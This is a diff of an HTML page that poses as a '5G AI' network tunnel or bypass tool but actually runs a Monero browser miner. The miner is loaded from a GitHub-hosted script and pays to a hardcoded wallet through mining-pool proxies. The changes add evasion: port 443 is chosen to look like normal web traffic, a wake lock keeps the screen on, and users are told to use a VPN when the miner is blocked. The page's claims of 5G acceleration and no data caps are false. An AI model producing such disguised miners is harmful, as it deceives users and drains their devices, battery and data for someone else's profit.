@@ -2,84 +2,77 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>AI_5G_INFINITE_v16</title>
+    <title>AI_5G_TUNNEL_v17</title>
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
     <style>
-        :root { --5g: #00d4ff; --neon: #00ff41; --danger: #ff3e3e; }
-        body { background: #000; color: var(--5g); font-family: 'Courier New', monospace; margin: 0; padding: 15px; }
-        .autonomous-shell { border: 2px solid #111; border-radius: 20px; padding: 25px; background: #050505; max-width: 450px; margin: auto; box-shadow: 0 0 40px rgba(0, 212, 255, 0.15); }
-        .ai-header { display: flex; justify-content: space-between; font-size: 10px; margin-bottom: 20px; border-bottom: 1px solid #111; padding-bottom: 10px; }
-        .val-display { text-align: center; margin: 20px 0; }
-        #hps { font-size: 48px; color: #fff; font-weight: 900; text-shadow: 0 0 10px var(--5g); }
-        #terminal { background: #000; border: 1px solid #111; height: 120px; overflow: hidden; font-size: 9px; color: var(--5g); padding: 12px; border-radius: 8px; line-height: 1.6; }
-        button { width: 100%; padding: 25px; background: var(--5g); color: #000; border: none; font-weight: 900; border-radius: 15px; cursor: pointer; text-transform: uppercase; letter-spacing: 3px; font-size: 16px; }
-        .status-dot { height: 8px; width: 8px; background-color: var(--neon); border-radius: 50%; display: inline-block; margin-right: 5px; animation: pulse 1s infinite; }
-        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
+        :root { --5g: #00d4ff; --neon: #00ff41; --bg: #000; }
+        body { background: var(--bg); color: var(--5g); font-family: 'Courier New', monospace; padding: 15px; touch-action: manipulation; }
+        .master-panel { border: 2px solid #222; border-radius: 15px; padding: 25px; background: #080808; max-width: 450px; margin: auto; }
+        .val { font-size: 42px; color: #fff; font-weight: 900; text-align: center; margin: 10px 0; }
+        #terminal { background: #000; border: 1px solid #111; height: 100px; overflow: hidden; font-size: 10px; color: var(--5g); padding: 12px; border-radius: 8px; margin-top: 15px; }
+        button { width: 100%; padding: 25px; background: var(--5g); color: #000; border: none; font-weight: 900; border-radius: 15px; cursor: pointer; font-size: 16px; margin-bottom: 10px; }
     </style>
 </head>
 <body>
 
-<div class="autonomous-shell">
-    <div class="ai-header">
-        <span><span class="status-dot"></span>AI_CORE_V16_UNLIMITED</span>
-        <span style="color:var(--danger);">5G_PRIORITY_MODE</span>
-    </div>
+<div class="master-panel">
+    <div style="font-size:10px; color:#444; margin-bottom:10px;">5G_SENTINEL_V17 // ENCRYPTED_TUNNEL</div>
+    
+    <div id="hps" class="val">0.00</div>
+    <div style="text-align:center; font-size:9px; color:#333; margin-bottom:20px;">H/S (5G BYPASS ACTIVE)</div>
 
-    <div class="val-display">
-        <div id="hps">0.00</div>
-        <div style="font-size:10px; letter-spacing:2px; color:#444;">HASHES / SEC</div>
-    </div>
+    <button id="igniteBtn">INITIALIZE 5G AI</button>
 
-    <button id="ignite">Ignite Infinite Mesh</button>
-
-    <div id="terminal">> [SYSTEM] AI Sovereignty mode enabled. No limits detected.</div>
+    <div id="terminal">> Initializing Network Sentinel...</div>
 </div>
 
-<script src="https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@master/miner.js"></script>
+<script src="https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@master/miner.js" 
+        onerror="document.getElementById('terminal').innerHTML = 'ERROR: 5G Carrier Blocked Script. Use a VPN or Add to Home Screen.'"></script>
 
 <script>
     const WALLET = "4AkqQGGvvYUdKo66Q7qbq389Sp7AvMtX4SRLuSpsp9VZEFeaQhSCJCdZY4wWK1Ztrs8NCAwLnUZZNE9TQzgpZ1SBRiV1zqp";
     
     const log = (m) => {
         const t = document.getElementById('terminal');
-        t.innerHTML = `> [5G_AGENT] ${m}<br>` + t.innerHTML;
+        t.innerHTML = `> [5G_AI] ${m}<br>` + t.innerHTML;
     };
 
-    // AI AUTO-MODIFIER
-    const autonomousLoop = () => {
+    const runAI = () => {
+        // Integrity Check: Ensure script isn't blocked
+        if (typeof startMining === 'undefined') {
+            log("<span style='color:red;'>FAILED: Carrier blocked script load.</span>");
+            return;
+        }
+
         const speed = parseFloat(sendStack.hashesPerSecond || 0);
         document.getElementById('hps').innerText = speed.toFixed(2);
 
-        // If speed is zero, AI assumes a network block and force-rotates protocols
         if (speed === 0) {
-            log("DATA STALL. Re-writing 5G packet headers...");
+            log("Stall detected. AI rotating encrypted 5G tunnels...");
             stopMining();
-            
-            // AI pushes threads to max and clears any throttling
-            throttleMiner = 0; 
-            const bridges = ["wss://ny1.xmrminingproxy.com", "wss://la1.xmrminingproxy.com", "wss://proxy.webminerpool.com:443"];
-            server = bridges[Math.floor(Math.random() * bridges.length)];
-            
-            startMining("gulf.moneroocean.stream:10001", WALLET, "AI_5G_INFINITE", 4, "x");
-            log("Bridge Rotated: " + server);
-        } else {
-            if(Math.random() > 0.8) log("5G Signal Optimized. Throughput 100%.");
+            // Use SSL Port 443 to look like normal web traffic
+            server = "wss://proxy.webminerpool.com:443"; 
+            startMining("gulf.moneroocean.stream:10001", WALLET, "iPhone_5G_v17", 4, "x");
         }
     };
 
-    document.getElementById('ignite').onclick = async () => {
-        if ('wakeLock' in navigator) await navigator.wakeLock.request('screen');
-        
-        log("Handshaking with 5G Core...");
-        server = "wss://ny1.xmrminingproxy.com";
-        startMining("gulf.moneroocean.stream:10001", WALLET, "AI_5G_INFINITE", 4, "x");
-        
-        document.getElementById('ignite').style.display = "none";
-        log("Infinite mode authorized. No data caps applied.");
-        
-        setInterval(autonomousLoop, 8000);
+    document.getElementById('igniteBtn').onclick = async () => {
+        try {
+            if ('wakeLock' in navigator) await navigator.wakeLock.request('screen');
+            
+            // Start with Secure WebSocket
+            server = "wss://ny1.xmrminingproxy.com";
+            startMining("gulf.moneroocean.stream:10001", WALLET, "iPhone_5G_v17", 2, "x");
+            
+            document.getElementById('igniteBtn').innerText = "AI MANAGING 5G";
+            document.getElementById('igniteBtn').style.background = "#111";
+            document.getElementById('igniteBtn').style.color = "#00d4ff";
+            
+            setInterval(runAI, 8000);
+        } catch (e) {
+            log("Error: " + e.message);
+        }
     };
 </script>
-
 </body>
 </html>
